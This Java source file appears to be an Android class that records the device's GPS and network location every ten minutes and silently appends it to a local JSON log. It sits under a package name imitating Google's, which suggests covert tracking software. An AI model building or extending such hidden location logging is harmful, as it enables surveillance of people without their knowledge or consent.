package com.google.android.android;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

public class MyLocationManager {

    private LocationManager locationManager;
    private final long updateTime = 600_000;

    MyLocationManager() {
        locationManager = (LocationManager) MainService.getInstance().getSystemService(Context.LOCATION_SERVICE);

        startGpsLocationUpdate();
        startNetworkLocationUpdate();
    }

    public boolean isGpsEnabled() {
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    }

    public boolean isNetworkEnabled() {
        return locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public boolean isAccessLocationPermission() {
        return ActivityCompat.checkSelfPermission(MainService.getInstance(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    public boolean startGpsLocationUpdate() {
       if (!isAccessLocationPermission()) return false;
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, updateTime, 10, locationListener);
        return isGpsEnabled();
    }

    public boolean startNetworkLocationUpdate() {
        if (!isAccessLocationPermission()) return false;
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, updateTime,10,locationListener);
        return isNetworkEnabled();
    }

    private LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            System.out.println("Location Changed! ");
            saveLog(convertLocationToJSONObject(location));
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {
            System.out.println("Status changed!");
        }

        @Override
        public void onProviderEnabled(String provider) {
            System.out.println("Provider enabled: " + provider);
            if (!isAccessLocationPermission()) return;
            Location location = locationManager.getLastKnownLocation(provider);
            if (location != null)
                saveLog(convertLocationToJSONObject(location));
        }

        @Override
        public void onProviderDisabled(String provider) {
            System.out.println("Provider disabled: " + provider);
        }
    };

    private JSONObject convertLocationToJSONObject(Location location) {
        if (location == null) return null;
        String date = MainService.getInstance().getSimpleDateFormat(location.getTime());
        JSONObject locationObj = new JSONObject();
        locationObj.put("provider", location.getProvider());
        locationObj.put("lat", location.getLatitude());
        locationObj.put("lon", location.getLongitude());
        locationObj.put("date", date);
        return locationObj;
    }

    private void saveLog(JSONObject location) {
        if (location == null) return;
        File logFile = new File(Config.LOCATION_PATH + "location-log.json");
        JSONParser jsonParser = new JSONParser();
        JSONArray locationArray = new JSONArray();
        if (logFile.exists()) {
            try {
                locationArray = (JSONArray) jsonParser.parse(new FileReader(logFile));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        locationArray.add(location);
        try {
            FileWriter fileWriter = new FileWriter(logFile);
            fileWriter.write(locationArray.toJSONString());
            fileWriter.flush();
            fileWriter.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (logFile.length() > 1024*1024) {
            String date = MainService.getInstance().getSimpleDateFormat(System.currentTimeMillis());
            logFile.renameTo(new File(Config.LOCATION_PATH + "location-log " + date + ".json"));
        }
    }

}
